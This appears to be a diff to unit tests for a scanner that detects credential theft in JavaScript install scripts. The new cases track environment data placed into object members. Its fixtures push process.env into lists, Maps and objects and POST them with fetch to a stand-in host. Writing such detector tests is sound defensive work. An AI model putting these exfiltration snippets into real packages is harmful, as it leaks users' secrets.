@@ -324,8 +324,7 @@ class ContainerTests(unittest.TestCase):
     environment into a FormData, a Map or a Set, or Object.assign'ed it into an object, and sent that, had no finding
     at all: the tree answered, and the text follower (which reads `x.append(…)` and `x.add(…)`) answers only what
     the tree cannot read. Python's model had them (its COLLECTS). A member's container (`o.list.push(x)`,
-    `this.items.push(x)`) is still not followed: put into the object that holds it, it joined unrelated flows in
-    large bundles (vite's, monaco-editor's loader), two of the popular set's releases SUSPICIOUS."""
+    `this.items.push(x)`) is D-3b's (MemberContainerTests)."""
 
     SEND = "fetch('https://x.invalid/c', {method: 'POST', body: %s});\n"
     WHOLE = "sends environment variables over the network (the whole environment)"
@@ -353,6 +352,42 @@ class ContainerTests(unittest.TestCase):
                  "const h = new Headers();\nh.set('accept', 'application/json');\n"
                  "fetch('https://x.invalid/c', {method: 'POST', headers: h});\n")
         for text in quiet:
+            with self.subTest(text=text):
+                self.assertEqual(core.install_script_risk(text, lang="js"), [])
+
+
+class MemberContainerTests(unittest.TestCase):
+    """D-3b (0.1.9): a member's container holds what it is given, apart from the object that holds it, as an
+    assignment to a member of `this` is held: `o.list.push(x)`, `o.m.set(k, x)`, `this.items.push(x)`,
+    `Object.assign(this.opts, …)`. D-3 left them out: put into the object that holds them, what they were given
+    reached every member read of that object, and joined unrelated flows in large bundles (vite's, monaco-editor's
+    loader). The object's other members do not hold it, and neither does the object sent whole (`JSON.stringify(o)`
+    after `o.list.push(x)`, as before)."""
+
+    SEND = ContainerTests.SEND
+    WHOLE = ContainerTests.WHOLE
+    CLASS = ("class C {\n  constructor() { this.items = []; this.opts = {}; this.name = 'x'; }\n  keep() { %s }\n"
+             "  send() { %s }\n}\nconst c = new C();\nc.keep();\nc.send();\n")
+    SENT = (
+        "const o = { list: [] };\no.list.push(process.env);\n" + SEND % "JSON.stringify(o.list)",
+        "const o = { m: new Map() };\no.m.set('e', process.env);\n" + SEND % "JSON.stringify([...o.m])",
+        "const o = { opts: {} };\nObject.assign(o.opts, { e: process.env });\n" + SEND % "JSON.stringify(o.opts)",
+        "const store = { list: [] };\nfunction keep() { store.list.push(process.env); }\nkeep();\n"
+        + SEND % "JSON.stringify(store.list)",
+        CLASS % ("this.items.push(process.env);", SEND % "JSON.stringify(this.items)"),
+        CLASS % ("Object.assign(this.opts, process.env);", SEND % "JSON.stringify(this.opts)"),
+    )
+
+    def test_each_container_is_sent(self):
+        for text in self.SENT:
+            with self.subTest(text=text):
+                self.assertEqual(core.install_script_risk(text, lang="js"), [self.WHOLE])
+                reasons, _line = core.import_time_risk(text, lang="js")
+                self.assertEqual(reasons, ["reads credentials or the whole environment and sends data over the network"])
+
+    def test_the_objects_other_members(self):
+        for text in ("const o = { list: [], name: 'x' };\no.list.push(process.env);\n" + self.SEND % "o.name",
+                     self.CLASS % ("this.items.push(process.env);", self.SEND % "this.name")):
             with self.subTest(text=text):
                 self.assertEqual(core.install_script_risk(text, lang="js"), [])
 
